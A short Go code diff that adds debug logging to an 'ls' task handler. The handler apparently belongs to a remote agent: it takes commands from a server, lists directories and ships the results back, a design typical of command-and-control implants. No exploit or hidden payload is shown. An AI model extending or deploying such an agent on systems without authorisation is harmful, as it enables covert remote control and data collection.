@@ -5,11 +5,15 @@ package agent_helper
 import (
 	"fmt"
 	"os"
+	"galleon/debug"
 	"time"
 )
 
 func LsHandler(serverUrl string, taskData map[string]interface{}) {
 	dir, err := ListDirectories(taskData["args"].(string))
+	if debug.Debug {
+		fmt.Printf("[*] ls: %v\n", taskData["args"].(string))
+	}
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
 		return
